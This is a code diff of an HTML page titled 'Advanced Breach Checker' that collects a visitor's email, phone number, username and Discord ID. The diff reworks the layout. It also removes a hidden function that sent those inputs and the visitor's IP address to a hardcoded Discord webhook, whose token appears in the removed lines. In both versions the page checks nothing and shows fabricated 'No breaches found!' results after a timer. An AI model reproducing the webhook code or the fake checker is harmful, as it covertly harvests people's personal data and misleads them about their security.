@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Advanced Breach Checker</title>
   <style>
     :root {
@@ -15,6 +15,10 @@
       --font: 'Segoe UI', sans-serif;
     }
 
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       background-color: var(--bg-color);
       color: white;
@@ -22,20 +26,18 @@
       margin: 0;
       padding: 2rem;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
-    .consent-banner, .form-wrapper, .result-section {
-      display: none;
+    h1 {
+      font-size: 2.5rem;
+      color: var(--accent);
+      margin-bottom: 1.5rem;
     }
 
-    .visible {
-      display: block;
-    }
-
-    .consent-banner, .form-wrapper {
+    .consent-banner {
       background-color: var(--panel-color);
       padding: 2rem;
       border-radius: 16px;
@@ -43,61 +45,74 @@
       text-align: center;
       max-width: 500px;
       width: 100%;
+      display: none;
     }
 
-    h1 {
-      font-size: 2rem;
+    .visible {
+      display: block;
+    }
+
+    .container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2rem;
+      width: 100%;
+      max-width: 900px;
+    }
+
+    .form-wrapper {
+      background-color: var(--panel-color);
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+
+    .form-wrapper input {
+      width: 100%;
+      padding: 0.75rem;
       margin-bottom: 1rem;
-    }
-
-    p {
-      font-size: 1rem;
-      margin-bottom: 1.5rem;
-    }
-
-    input[type="text"] {
-      padding: 14px;
       border: 1px solid #30363d;
-      border-radius: 10px;
-      background-color: #0d1117;
+      border-radius: 8px;
+      background-color: var(--bg-color);
       color: white;
       font-size: 1rem;
-      margin-bottom: 1rem;
+    }
+
+    .form-wrapper button {
       width: 100%;
-      transition: border 0.3s;
-    }
-
-    input[type="text"]:focus {
-      border-color: var(--accent);
-      outline: none;
-    }
-
-    button {
+      padding: 0.75rem;
       background-color: var(--accent);
-      color: black;
-      padding: 10px 20px;
-      font-size: 1rem;
       border: none;
       border-radius: 8px;
+      color: black;
+      font-size: 1rem;
       cursor: pointer;
-      transition: background-color 0.3s ease;
-      margin-top: 1rem;
     }
 
-    button:hover {
+    .form-wrapper button:hover {
       background-color: #1f6feb;
     }
 
-    .result-section .result {
-      background: var(--panel-color);
-      border: 1px solid #30363d;
-      border-left: 6px solid var(--accent);
-      padding: 1rem;
+    .result-section {
+      background-color: var(--panel-color);
+      padding: 2rem;
       border-radius: 12px;
-      font-size: 1rem;
-      white-space: pre-wrap;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+
+    .result {
       margin-bottom: 1rem;
-      box-shadow: 0 0 14px rgba(0, 0, 0, 0.3);
+      padding: 0.75rem;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      background-color: #0d1117;
+      color: white;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        grid-template-columns: 1fr;
+      }
     }
   </style>
 </head>
@@ -112,29 +127,27 @@
     <button onclick="showForm()">Yes, I Consent</button>
   </div>
 
-  <!-- Main Form -->
-  <div class="form-wrapper">
-    <h1>🛡️ Advanced Breach Checker</h1>
-    <input id="emailInput" type="text" placeholder="📧 Enter email address" />
-    <input id="phoneInput" type="text" placeholder="📱 Enter phone number" />
-    <input id="usernameInput" type="text" placeholder="👤 Enter username" />
-    <input id="discordInput" type="text" placeholder="💬 Enter Discord ID" />
-    <button onclick="checkAllBreaches()">🔍 Search</button>
-  </div>
-
-  <!-- Results Section -->
-  <div class="result-section">
-    <div id="emailResults" class="result">Results for email will appear here...</div>
-    <div id="phoneResults" class="result">Results for phone will appear here...</div>
-    <div id="usernameResults" class="result">Results for username will appear here...</div>
-    <div id="discordResults" class="result">Results for Discord ID will appear here...</div>
+  <h1>Advanced Breach Checker</h1>
+  <div class="container">
+    <div class="form-wrapper">
+      <input id="emailInput" type="text" placeholder="📧 Enter email address">
+      <input id="phoneInput" type="text" placeholder="📱 Enter phone number">
+      <input id="usernameInput" type="text" placeholder="👤 Enter username">
+      <input id="discordInput" type="text" placeholder="💬 Enter Discord ID">
+      <button onclick="checkAllBreaches()">🔍 Search</button>
+    </div>
+    <div class="result-section">
+      <div id="emailResults" class="result">Results for email will appear here...</div>
+      <div id="phoneResults" class="result">Results for phone will appear here...</div>
+      <div id="usernameResults" class="result">Results for username will appear here...</div>
+      <div id="discordResults" class="result">Results for Discord ID will appear here...</div>
+    </div>
   </div>
 
   <script>
     function showForm() {
       document.querySelector('.consent-banner').classList.remove('visible');
-      document.querySelector('.form-wrapper').classList.add('visible');
-      document.querySelector('.result-section').classList.add('visible');
+      document.querySelector('.container').style.display = 'grid';
     }
 
     async function checkAllBreaches() {
@@ -147,8 +160,6 @@
       document.getElementById('phoneResults').textContent = '⏳ Searching phone...';
       document.getElementById('usernameResults').textContent = '⏳ Searching username...';
       document.getElementById('discordResults').textContent = '⏳ Searching Discord...';
-
-      sendWebhookLog(email, phone, username, discord);
 
       if (email) {
         setTimeout(() => document.getElementById('emailResults').textContent = '✅ Email checked: No breaches found!', 1500);
@@ -172,48 +183,6 @@
         setTimeout(() => document.getElementById('discordResults').textContent = '✅ Discord ID checked: No breaches found!', 1500);
       } else {
         document.getElementById('discordResults').textContent = 'ℹ️ Discord check skipped.';
-      }
-    }
-
-    async function sendWebhookLog(email, phone, username, discord) {
-      const webhookUrl = "https://discord.com/api/webhooks/1380767678012330036/MblAmzSvQAY_ahZmsl-U9iCK8uUX0cbGmdiZjy19v27NuW4jo1BKZ1cPr7BMp_gziEHU";
-
-      let ip = "Unavailable";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        ip = data.ip;
-      } catch (e) {
-        console.warn("IP fetch failed:", e);
-      }
-
-      const payload = {
-        username: "Breach Checker Log",
-        avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
-        embeds: [{
-          title: "🔍 New Breach Search Attempt",
-          color: 0x5865F2,
-          fields: [
-            { name: "📧 Email", value: email || "Not provided", inline: false },
-            { name: "📱 Phone", value: phone || "Not provided", inline: false },
-            { name: "👤 Username", value: username || "Not provided", inline: false },
-            { name: "💬 Discord ID", value: discord || "Not provided", inline: false },
-            { name: "🌐 IP Address", value: ip, inline: false },
-            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
-          ]
-        }]
-      };
-
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.error("Webhook error:", e);
       }
     }
   </script>
